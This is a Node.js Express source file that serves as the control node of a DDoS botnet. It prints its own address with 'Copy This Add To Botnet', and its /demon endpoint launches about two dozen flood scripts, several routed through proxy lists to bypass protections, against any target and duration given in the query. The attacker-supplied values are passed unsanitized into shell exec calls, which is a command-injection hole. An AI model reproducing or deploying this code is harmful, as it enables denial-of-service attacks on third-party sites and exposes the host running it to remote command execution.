const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
const scrapeProxies = require('./proxy.js');

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

app.get('/demon', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  // Eksekusi sesuai methods
  if (methods === 'ninja') {
    console.log('received');
    exec(`node ./lib/cache/StarsXNinja.js ${target} ${time}`);
  } else if (methods === 'mix') {
    console.log('received');
    exec(`node ./lib/cache/StarsXMix.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'strike') {
    exec(`node methods/strike.js GET ${target} ${time} 10 90 proxy.txt --full --legit`);
  } else if (methods === 'tls') {
    exec(`node methods/tls.js ${target} ${time} 100 10`);
  } else if (methods === 'flood') {
    exec(`node methods/flood.js ${target} ${time}`);
  } else if (methods === 'spike') {
    exec(`node methods/spike.js ${target} 10 ${time}`);
  } else if (methods === 'raw') {
    exec(`node methods/raw.js ${target} ${time}`);
  } else if (methods === 'gojo') {
    exec(`node methods/gojov5.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'tlskill') {
    exec(`node methods/TLS-KILL.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'tlsop') {
    exec(`node methods/tlsop.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'storm') {
    exec(`node methods/storm.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'destroy') {
    exec(`node methods/DESTROY.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'thunder') {
    exec(`node methods/thunder.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'bypass') {
    exec(`node methods/bypass.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'cf-flood') {
    exec(`node methods/cf-flood.js ${target} ${time}`);
  } else if (methods === 'http-vip') {
    exec(`node methods/HTTP-VIP.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'uam') {
    exec(`node methods/uambypass.js ${target} ${time} 100 proxy.txt`);
  } else if (methods === 'rape') {
    exec(`node methods/rape.js GET ${time} 10 proxy.txt 100 ${target}`);
  } else if (methods === 'tornado') {
    exec(`node methods/TORNADOV2.js GET ${target} ${time} 10 100 proxy.txt`);
  } else if (methods === 'raw-mix') {
    exec(`node methods/RAW-MIX.js ${target} ${time}`);
  } else if (methods === 'drown') {
    exec(`node methods/drown.js ${target} ${time} 10 100`);
  } else if (methods === 'cookie') {
    exec(`node methods/cookie.js ${target} ${time} 10 100 proxy.txt`);
  } else if (methods === 'tls-slow') {
    exec(`node methods/YAT-TLS.js ${target} ${time} 100 10 proxy.txt`);
  } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  fetchData();
});
